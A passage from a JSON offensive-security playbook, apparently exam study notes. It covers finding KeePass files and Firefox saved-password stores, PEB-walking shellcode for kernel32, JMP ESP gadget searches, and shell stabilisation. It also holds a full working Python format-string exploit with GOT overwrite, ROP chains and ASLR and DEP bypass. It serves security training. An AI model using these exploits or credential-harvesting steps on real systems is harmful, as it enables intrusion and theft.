            "content": "This displays all files in a tree structure, useful for finding sensitive files quickly.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "KeePass Password Manager",
    "title": "Finding KDBX Files",
    "tags": [],
    "steps": [
      {
        "title": "Windows Discovery",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
          },
          {
            "lang": "bash",
            "code": "dir /s /b *.kdbx"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux Discovery",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -name \"*.kdbx\" 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Locations",
        "codes": [
          {
            "lang": "plaintext",
            "code": "# Windows\nC:\\Users\\<Username>\\Documents\\Database.kdbx\nC:\\Users\\<Username>\\Desktop\\passwords.kdbx\nC:\\Users\\<Username>\\Downloads\\keepass.kdbx\nC:\\Program Files\\KeePass\\Database.kdbx\n\n# Linux\n/home/<username>/Documents/Database.kdbx\n/home/<username>/.keepass/Database.kdbx\n/opt/keepass/Database.kdbx"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SMB Share Discovery",
        "codes": [
          {
            "lang": "bash",
            "code": "# List shares\nsmbclient -L //<TargetIP>\n\n# Connect to share\nsmbclient //<TargetIP>/Users -U <Username>\n\n# Search for KDBX files\nsmb: \\> recurse ON\nsmb: \\> prompt OFF\nsmb: \\> mget *.kdbx"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Finding kernel32",
    "title": "Finding kernel32.dll Base Address",
    "tags": [
      "Binary_Exploitation",
      "Custom_Tools",
      "Debugging",
      "Exploitation",
      "Windows"
    ],
    "steps": [
      {
        "title": "PEB Method Overview [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "FS:[0x30] -> PEB\nPEB + 0x0C -> Ldr (PEB_LDR_DATA)\nLdr + 0x14 -> InMemoryOrderModuleList\nList entries contain DLL base addresses"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Walk the **InMemoryOrderModuleList** to find kernel32.dll:",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Module List Structure [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Entry + 0x00 = Flink (next entry)\nEntry + 0x04 = Blink (previous entry)\nEntry + 0x10 = DllBase (base address of module)\nEntry + 0x28 = BaseDllName (UNICODE_STRING)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Each entry in InMemoryOrderModuleList is LDR_DATA_TABLE_ENTRY."
          }
        ]
      },
      {
        "title": "Module Load Order [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Modules appear in specific order in **InMemoryOrderModuleList**:\n1. Executable itself (e.g., target.exe)\n2. **ntdll.dll**\n3. **kernel32.dll** (or **kernelbase.dll** on Windows 7+)",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Find kernel32.dll Assembly",
        "codes": [
          {
            "lang": "nasm",
            "code": "find_kernel32:\n    xor ecx, ecx                ; ECX = 0\n    mov eax, fs:[ecx + 0x30]    ; EAX = PEB address\n    mov eax, [eax + 0x0c]       ; EAX = Ldr (PEB_LDR_DATA)\n    mov esi, [eax + 0x14]       ; ESI = InMemoryOrderModuleList.Flink\n\nnext_module:\n    mov ebx, [esi + 0x10]       ; EBX = DllBase\n    mov edi, [esi + 0x28]       ; EDI = BaseDllName (UNICODE_STRING buffer)\n    mov esi, [esi]              ; ESI = Next entry (Flink)\n    cmp [edi + 12*2], cl        ; Check 13th char of name (NULL for kernel32)\n    jne next_module             ; If not kernel32, continue\n\n    ; EBX now contains kernel32.dll base address"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Assembly code to locate kernel32.dll base address."
          }
        ]
      },
      {
        "title": "Alternative: Third Module Method",
        "codes": [
          {
            "lang": "nasm",
            "code": "find_kernel32_simple:\n    xor ecx, ecx\n    mov eax, fs:[ecx + 0x30]    ; PEB\n    mov eax, [eax + 0x0c]       ; Ldr\n    mov eax, [eax + 0x14]       ; InMemoryOrderModuleList (first = exe)\n    mov eax, [eax]              ; Second entry (ntdll.dll)\n    mov eax, [eax]              ; Third entry (kernel32.dll)\n    mov eax, [eax + 0x10]       ; DllBase of kernel32.dll"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Simply get the third module in the list (usually kernel32)."
          }
        ]
      },
      {
        "title": "Verify in WinDbg",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> dt ntdll!_PEB @$peb Ldr\n0:000> dt ntdll!_PEB_LDR_DATA poi(@$peb+0xc)\n0:000> !peb\n0:000> lm m kernel32"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Confirm the PEB structure and module list."
          }
        ]
      },
      {
        "title": "Walk Module List in WinDbg",
        "codes": [
          {
            "lang": "text",
            "code": "; Get first entry\n0:000> dd poi(poi(@$peb+0xc)+0x14)\n\n; Get DllBase from entry\n0:000> dd poi(poi(@$peb+0xc)+0x14)+0x10 L1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Manually walk the InMemoryOrderModuleList."
          }
        ]
      },
      {
        "title": "Complete PEB Method (NULL-Free)",
        "codes": [
          {
            "lang": "nasm",
            "code": "find_kernel32:\n    xor ecx, ecx                ; Zero ECX\n    mul ecx                     ; Zero EAX and EDX\n    mov eax, fs:[ecx + 0x30]    ; EAX = &PEB\n    mov eax, [eax + 0x0c]       ; EAX = PEB->Ldr\n    mov esi, [eax + 0x14]       ; ESI = Ldr->InMemoryOrderModuleList.Flink\n    lodsd                       ; EAX = Second entry (ntdll.dll)\n    xchg eax, esi               ; ESI = Second entry\n    lodsd                       ; EAX = Third entry (kernel32.dll)\n    mov ebx, [eax + 0x10]       ; EBX = kernel32.dll base address"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Production-ready assembly."
          }
        ]
      },
      {
        "title": "Assemble with Keystone",
        "codes": [
          {
            "lang": "python",
            "code": "from keystone import *\n\nks = Ks(KS_ARCH_X86, KS_MODE_32)\n\ncode = \"\"\"\n    xor ecx, ecx\n    mul ecx\n    mov eax, fs:[ecx + 0x30]\n    mov eax, [eax + 0x0c]\n    mov esi, [eax + 0x14]\n    lodsd\n    xchg eax, esi\n    lodsd\n    mov ebx, [eax + 0x10]\n\"\"\"\n\nencoding, count = ks.asm(code)\nshellcode = bytes(encoding)\nprint(f\"Shellcode ({len(shellcode)} bytes):\")\nprint(\"\".join(f\"\\\\x{b:02x}\" for b in shellcode))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Convert assembly to shellcode bytes using the **Keystone** engine."
          }
        ]
      },
      {
        "title": "Check for NULL Bytes",
        "codes": [
          {
            "lang": "python",
            "code": "if b\"\\x00\" in shellcode:\n    print(\"WARNING: Contains NULL bytes!\")\n    for i, b in enumerate(shellcode):\n        if b == 0:\n            print(f\"  NULL at offset {i}\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify shellcode is NULL-free."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "PEB Structure",
        "url": "https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Locate **kernel32.dll** in memory using the **PEB** method for reliable shellcode."
      }
    ]
  },
  {
    "category": "Return Address Discovery",
    "title": "Finding Return Addresses",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Stack_Overflow",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "JMP ESP Concept [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Stack after RET executes:\nESP -> [Shellcode starts here]\n\nJMP ESP instruction:\nEIP -> JMP ESP -> ESP -> Shellcode executes"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "After overflow, ESP points to data after the return address. **JMP ESP** redirects execution there:",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Find JMP ESP with Mona",
        "codes": [
          {
            "lang": "text",
            "code": "!mona jmp -r esp\n!mona jmp -r esp -m <Module>        ; Search specific module\n!mona jmp -r esp -cpb \"\\x00\\x0a\"    ; Exclude bad characters"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use mona.py in Immunity Debugger to find gadgets."
          }
        ]
      },
      {
        "title": "Find JMP ESP in WinDbg",
        "codes": [
          {
            "lang": "text",
            "code": "s -b <ModuleBase> L<ModuleSize> ff e4"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search for JMP ESP opcode (FF E4) in loaded modules."
          }
        ]
      },
      {
        "title": "Get Module Base and Size",
        "codes": [
          {
            "lang": "text",
            "code": "lm m <ModuleName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Identify module boundaries for searching."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Example output: `10000000 10050000 mymodule`\nBase = 0x10000000, End = 0x10050000, Size = 0x50000"
          }
        ]
      },
      {
        "title": "Search All Modules for JMP ESP",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> s -b 10000000 L50000 ff e4\n10001234  ff e4 ...                  ; Found JMP ESP at 0x10001234"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Manual search across module range."
          }
        ]
      },
      {
        "title": "Alternative Gadgets",
        "codes": [
          {
            "lang": "text",
            "code": "JMP ESP     = FF E4\nCALL ESP    = FF D4\nPUSH ESP; RET = 54 C3"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Other instructions that achieve same result."
          }
        ]
      },
      {
        "title": "Search for CALL ESP",
        "codes": [
          {
            "lang": "text",
            "code": "s -b <ModuleBase> L<ModuleSize> ff d4"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "CALL ESP can also redirect to shellcode."
          }
        ]
      },
      {
        "title": "Search for PUSH ESP; RET",
        "codes": [
          {
            "lang": "text",
            "code": "s -b <ModuleBase> L<ModuleSize> 54 c3"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Two-instruction sequence."
          }
        ]
      },
      {
        "title": "Verify Gadget is Executable",
        "codes": [
          {
            "lang": "text",
            "code": "!vprot <GadgetAddress>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Ensure the address is in executable memory."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Look for PAGE_EXECUTE_READ or PAGE_EXECUTE_READWRITE."
          }
        ]
      },
      {
        "title": "Check Module Protections",
        "codes": [
          {
            "lang": "text",
            "code": "!mona modules                        ; List all modules with protections\n!mona noaslr                         ; Find non-ASLR modules"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Prefer modules without ASLR, SafeSEH, or DEP."
          }
        ]
      },
      {
        "title": "Module Protection Flags [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Understanding module security features:\n- **Rebase**: Module can be rebased (less predictable)\n- **SafeSEH**: SEH handler validation enabled\n- **ASLR**: Address Space Layout Randomization\n- **NXCompat**: DEP compatible\n- **OS DLL**: System DLL (usually protected)",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Ideal Module Characteristics",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Best modules for reliable exploitation:\n- No ASLR (Rebase = False)\n- No SafeSEH\n- No NXCompat\n- Application DLL (not OS DLL)\n- Address contains no bad characters",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Convert Address to Little Endian",
        "codes": [
          {
            "lang": "python",
            "code": "import struct\naddress = 0x10001234\npacked = struct.pack(\"<I\", address)  # b'\\x34\\x12\\x00\\x10'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "x86 uses little-endian byte order."
          }
        ]
      },
      {
        "title": "Verify Gadget Before Use",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> u 10001234 L1\n10001234 ffe4            jmp     esp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Confirm the instruction at the address."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Corelan Exploit Writing",
        "url": "https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Locate suitable return addresses (gadgets) to redirect execution to shellcode."
      }
    ]
  },
  {
    "category": "Linux Kiosk Breakout",
    "title": "Firefox Profile Exploitation",
    "tags": [
      "Defense_Evasion",
      "Linux",
      "Mobile",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Find Firefox Profiles",
        "codes": [
          {
            "lang": "text",
            "code": "file:///home/kiosk/.mozilla/firefox/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Read Saved Passwords",
        "codes": [
          {
            "lang": "text",
            "code": "file:///home/kiosk/.mozilla/firefox/<Profile>/logins.json\nfile:///home/kiosk/.mozilla/firefox/<Profile>/key4.db"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Preferences for Execution",
        "codes": [
          {
            "lang": "bash",
            "code": "# If can write to prefs.js\necho 'user_pref(\"browser.shell.checkDefaultBrowser\", false);' >> prefs.js"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Fixing Common Issues",
    "tags": [],
    "steps": [
      {
        "title": "Tab Completion Not Working",
        "codes": [
          {
            "lang": "bash",
            "code": "# Ensure bash is running\nbash\n\n# Source bashrc\nsource ~/.bashrc\n\n# Or\n. ~/.bashrc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Arrow Keys Show ^[[A",
        "codes": [
          {
            "lang": "bash",
            "code": "# Reset terminal\nreset\n\n# Set TERM\nexport TERM=xterm\n\n# Or try\nexport TERM=xterm-256color"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Ctrl+C Kills Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "# Need to do full stabilization\n# Background with Ctrl+Z\nstty raw -echo; fg"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Terminal Size Wrong",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali\nstty size\n# Output: 50 200\n\n# On target\nstty rows 50 columns 200"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Can't Use Vim/Nano",
        "codes": [
          {
            "lang": "bash",
            "code": "# Stabilize shell first\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nreset\nexport TERM=xterm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Fixing Exploits",
    "title": "Fixing Web Exploits",
    "tags": [
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Key Questions",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Before running a web exploit, verify:\n- Does it use HTTP or HTTPS?\n- Does it require authentication? What credentials?\n- Are there hardcoded paths that may differ?\n- Will self-signed certificates cause issues?",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Python requests - Disable SSL Verification",
        "codes": [
          {
            "lang": "python",
            "code": "response = requests.post(url, data=data, verify=False)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Issues",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Typical errors when running public exploits:\n- **IndexError: list index out of range** - Usually means a parameter name changed between versions. Add print statements to debug.\n- **SSL Errors** - Add `verify=False` to requests calls.\n- **Authentication Failures** - Check credential format and CSRF token handling.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Debugging Python Exploits",
        "codes": [
          {
            "lang": "python",
            "code": "print(\"[+] Debug: \" + variable_name)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Add print statements before failing lines to see actual values.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Web exploits are easier to modify than memory corruption. Check: protocol (HTTP/HTTPS), paths, authentication, SSL verification, CSRF tokens."
      }
    ]
  },
  {
    "category": "AD Forest Theory",
    "title": "Forest Enumeration",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enumerate Forest Domains",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADForest | Select-Object -ExpandProperty Domains"
          },
          {
            "lang": "powershell",
            "code": "Get-ForestDomain"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Enumerate Global Catalogs",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADForest | Select-Object -ExpandProperty GlobalCatalogs"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Enumerate External Trusts",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainTrust | Where-Object { $_.TrustType -eq \"External\" }"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Map All Trusts",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainTrustMapping"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Format String Exploitation",
    "title": "Format String Exploitation",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Format_String",
      "Windows"
    ],
    "steps": [
      {
        "title": "GOT Overwrite Strategy [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Redirect library calls to shellcode:\n1. Find **GOT** entry for commonly called function (e.g., printf, exit)\n2. Write shellcode address to GOT entry\n3. Trigger call to hijacked function\n4. Execution redirects to shellcode",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Find GOT Address",
        "codes": [
          {
            "lang": "text",
            "code": "; Using objdump\nobjdump -R <binary> | grep printf\n\n; In GDB/WinDbg\n0:000> x <module>!*printf*\n0:000> dps <module>+<IAT_offset>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Locate Global Offset Table entries."
          }
        ]
      },
      {
        "title": "GOT Overwrite Exploit",
        "codes": [
          {
            "lang": "python",
            "code": "import struct\nimport socket\n\ndef p32(addr):\n    return struct.pack(\"<I\", addr)\n\n# Target: overwrite printf GOT with shellcode address\nGOT_PRINTF = 0x08049000\nSHELLCODE_ADDR = 0x0804a000\n\n# Position where our input appears on stack\nPOSITION = 7\n\n# Build write payload (using %hhn for precision)\ndef build_got_overwrite():\n    # Split shellcode address into bytes\n    bytes_to_write = [\n        (GOT_PRINTF + 0, SHELLCODE_ADDR & 0xFF),\n        (GOT_PRINTF + 1, (SHELLCODE_ADDR >> 8) & 0xFF),\n        (GOT_PRINTF + 2, (SHELLCODE_ADDR >> 16) & 0xFF),\n        (GOT_PRINTF + 3, (SHELLCODE_ADDR >> 24) & 0xFF),\n    ]\n\n    # Build payload\n    payload = b\"\".join(p32(addr) for addr, _ in bytes_to_write)\n\n    sorted_writes = sorted(enumerate(bytes_to_write),\n                          key=lambda x: x[1][1])\n\n    printed = 16  # 4 addresses\n    for orig_idx, (addr, byte_val) in sorted_writes:\n        needed = (byte_val - printed) % 256\n        if needed > 0:\n            payload += f\"%{needed}c\".encode()\n            printed += needed\n        payload += f\"%{POSITION + orig_idx}$hhn\".encode()\n\n    return payload\n\nexploit = build_got_overwrite()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Overwrite GOT entry with format string."
          }
        ]
      },
      {
        "title": "Return Address Overwrite",
        "codes": [
          {
            "lang": "python",
            "code": "# Need to know stack address of saved return\n# Often from info leak or predictable stack\n\nSAVED_RET = 0xbffff4ac  # Stack address\nSHELLCODE_ADDR = 0xbffff500\n\n# Same technique as GOT overwrite\npayload = build_write(SAVED_RET, SHELLCODE_ADDR, POSITION)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Overwrite saved return address on stack."
          }
        ]
      },
      {
        "title": "Overwrite SEH Handler",
        "codes": [
          {
            "lang": "python",
            "code": "# Overwrite SEH handler, trigger exception\n\nSEH_HANDLER = 0x0012ff00  # Address of SEH handler on stack\nPOP_POP_RET = 0x10001000  # P/P/R gadget\n\npayload = build_write(SEH_HANDLER, POP_POP_RET, POSITION)\npayload += b\"\\xcc\" * 100  # Trigger access violation"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Target SEH for Windows exploitation."
          }
        ]
      },
      {
        "title": "Format String to ROP",
        "codes": [
          {
            "lang": "python",
            "code": "# Write ROP gadget addresses to stack\n# Then trigger return to begin ROP execution\n\nROP_CHAIN = [\n    0x10001000,  # pop eax; ret\n    0x41414141,  # value for eax\n    0x10001004,  # pop ecx; ret\n    # ...\n]\n\nSTACK_ADDR = 0xbffff400  # Where to write ROP chain\n\nfor i, gadget in enumerate(ROP_CHAIN):\n    write_dword(STACK_ADDR + i*4, gadget, POSITION)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use format string to set up ROP chain."
          }
        ]
      },
      {
        "title": "Complete Format String Exploit",
        "codes": [
          {
            "lang": "python",
            "code": "#!/usr/bin/env python3\nimport socket\nimport struct\n\ndef p32(addr):\n    return struct.pack(\"<I\", addr)\n\ndef u32(data):\n    return struct.unpack(\"<I\", data)[0]\n\nclass FormatStringExploit:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.position = None\n\n    def connect(self):\n        self.sock = socket.socket()\n        self.sock.connect((self.host, self.port))\n\n    def send(self, data):\n        self.sock.send(data + b\"\\n\")\n        return self.sock.recv(4096)\n\n    def find_position(self):\n        \"\"\"Find stack position of our input\"\"\"\n        for i in range(1, 50):\n            self.connect()\n            resp = self.send(f\"AAAA%{i}$08x\".encode())\n            self.sock.close()\n            if b\"41414141\" in resp:\n                self.position = i\n                return i\n        return None\n\n    def leak_stack(self, count=20):\n        \"\"\"Leak stack values\"\"\"\n        self.connect()\n        payload = b\".%08x\" * count\n        resp = self.send(payload)\n        self.sock.close()\n        return resp.split(b\".\")\n\n    def write_byte(self, addr, value):\n        \"\"\"Write single byte to address\"\"\"\n        payload = p32(addr)\n        printed = 4\n        needed = (value - printed) % 256\n        if needed > 0:\n            payload += f\"%{needed}c\".encode()\n        payload += f\"%{self.position}$hhn\".encode()\n        return payload\n\n    def write_dword(self, addr, value):\n        \"\"\"Write DWORD using 4 %hhn writes\"\"\"\n        addrs = [p32(addr + i) for i in range(4)]\n        bytes_list = [(value >> (i*8)) & 0xFF for i in range(4)]\n\n        # Sort by byte value to minimize padding\n        indexed = list(enumerate(zip(addrs, bytes_list)))\n        sorted_idx = sorted(indexed, key=lambda x: x[1][1])\n\n        payload = b\"\".join(addr for _, (addr, _) in sorted_idx)\n        printed = 16\n\n        for orig_pos, (_, byte_val) in sorted_idx:\n            needed = (byte_val - printed) % 256\n            if needed > 0:\n                payload += f\"%{needed}c\".encode()\n                printed += needed\n            payload += f\"%{self.position + orig_pos}$hhn\".encode()\n\n        return payload\n\n    def exploit_got(self, got_addr, shellcode_addr):\n        \"\"\"Overwrite GOT entry\"\"\"\n        if not self.position:\n            self.find_position()\n\n        payload = self.write_dword(got_addr, shellcode_addr)\n\n        self.connect()\n        self.send(payload)\n        # Next call to GOT function triggers shellcode\n\n# Usage\nexp = FormatStringExploit(\"<TargetIP>\", <Port>)\nexp.find_position()\nprint(f\"Input at position: {exp.position}\")\n\n# Leak addresses\nstack = exp.leak_stack()\nprint(\"Stack values:\", stack[:10])\n\n# Exploit\nexp.exploit_got(0x08049000, 0x0804a000)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Full exploitation script."
          }
        ]
      },
      {
        "title": "Bypass ASLR with Format String",
        "codes": [
          {
            "lang": "python",
            "code": "# Stage 1: Leak stack to find module base\nleaks = exp.leak_stack(50)\n# Find return address in leaks\nret_addr = find_return_in_leaks(leaks)\nbase = ret_addr - KNOWN_OFFSET\n\n# Stage 2: Calculate addresses\ngot_printf = base + GOT_OFFSET\nshellcode_loc = base + SHELLCODE_OFFSET\n\n# Stage 3: Exploit\nexp.exploit_got(got_printf, shellcode_loc)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Leak then exploit."
          }
        ]
      },
      {
        "title": "Format String + DEP Bypass",
        "codes": [
          {
            "lang": "python",
            "code": "# 1. Leak base address\n# 2. Calculate ROP gadgets\n# 3. Write ROP chain to stack using format string\n# 4. Overwrite return address to start chain\n\ndef write_rop_chain(exp, stack_base, rop_gadgets):\n    \"\"\"Write ROP chain using format string\"\"\"\n    for i, gadget in enumerate(rop_gadgets):\n        addr = stack_base + (i * 4)\n        exp.connect()\n        payload = exp.write_dword(addr, gadget)\n        exp.send(payload)\n        exp.sock.close()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Combine with ROP for modern systems."
          }
        ]
      },
      {
        "title": "Debugging Format String Exploits",
        "codes": [
          {
            "lang": "text",
            "code": "; Watch target address\n0:000> ba w1 <GOT_ADDR>\n\n; Examine after format string\n0:000> dd <GOT_ADDR> L1\n\n; Single step through printf\n0:000> bp printf\n0:000> g\n0:000> p    ; Step through format parsing"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify writes are working."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Format String Exploitation Techniques",
        "url": "https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Complete exploitation techniques using format string vulnerabilities."
      }
    ]
  },
  {
    "category": "Format String Read",
    "title": "Format String Read Primitives",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Format_String",
      "Windows"
    ],
    "steps": [
      {
        "title": "Leak Stack Values",
        "codes": [
          {
            "lang": "python",
            "code": "# Leak multiple stack values\npayload = b\"AAAA\" + b\".%08x\" * 30\n# Output: AAAA.value1.value2.value3...\n\n# Specific position\npayload = b\"%7$08x\"  # Leak 7th DWORD"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Read DWORDs from stack."
          }
        ]
      },
      {
        "title": "Find Buffer Position",
        "codes": [
          {
            "lang": "python",
            "code": "import socket\n\ndef find_position(host, port):\n    \"\"\"Find stack position containing our input\"\"\"\n    for i in range(1, 50):\n        s = socket.socket()\n        s.connect((host, port))\n        payload = f\"AAAA%{i}$08x\\n\".encode()\n        s.send(payload)\n        response = s.recv(1024).decode()\n        s.close()\n\n        if \"41414141\" in response:\n            print(f\"Input at position {i}\")\n            return i\n\n    return None\n\nposition = find_position(\"<TargetIP>\", <Port>)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine where input lands on stack."
          }
        ]
      },
      {
        "title": "Leak Specific Address",
        "codes": [
          {
            "lang": "python",
